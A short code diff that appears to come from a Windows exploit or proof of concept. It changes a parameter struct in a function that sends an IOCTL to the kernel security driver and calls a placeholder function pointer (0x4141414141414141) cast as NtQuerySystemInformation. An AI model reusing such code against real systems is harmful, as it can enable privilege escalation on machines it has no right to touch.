@@ -26,7 +26,8 @@ BOOL WINAPI LsaKsec_SendIoctl()
 	if (pParameterStruct > 0)
 	{
 		pParameterStruct->pInternalStruct = &InternalStruct;
-		pParameterStruct->rdx = (UINT16)0;
+		pParameterStruct->rdx = (ULONG)0;
+		pParameterStruct->unk = (ULONG)0;
 
 		while ((((PNTQUERYSYSTEMINFORMATION)0x4141414141414141)(0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL)) != STATUS_SUCCESS)
 		{
